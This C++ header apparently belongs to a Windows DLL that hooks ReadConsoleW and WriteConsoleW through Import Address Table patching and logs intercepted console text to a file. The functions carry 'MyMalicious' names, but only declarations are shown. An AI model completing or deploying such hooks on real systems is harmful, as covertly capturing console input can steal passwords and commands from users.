#pragma once
#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
// Windows Header Files:
#include <windows.h>
#include "tchar.h"
#include <iostream>

using namespace std;

void** getFunctionAddress(char const* wantedFunctionName, char const* wantedDllName);

enum MyMalicious {
	_MyMaliciousReadConsoleW,
	_MyMaliciousWriteConsoleW
};

BOOL WINAPI MyMaliciousReadConsoleW(
	_In_     HANDLE  hConsoleInput,
	_Out_    LPVOID  lpBuffer,
	_In_     DWORD   nNumberOfCharsToRead,
	_Out_    LPDWORD lpNumberOfCharsRead,
	_In_opt_ PCONSOLE_READCONSOLE_CONTROL  pInputControl
);

BOOL WINAPI MyMaliciousWriteConsoleW(
	_In_             HANDLE  hConsoleOutput,
	_In_       const VOID    *lpBuffer,
	_In_             DWORD   nNumberOfCharsToWrite,
	_Out_            LPDWORD lpNumberOfCharsWritten,
	_Reserved_       LPVOID  lpReserved
);

void writeToFile(char const* _Filename, char const* opening, void const* lpBuffer, MyMalicious func);

void PatchIAT(char const* const wantedFunctionName, char const* const wantedDllName, MyMalicious func);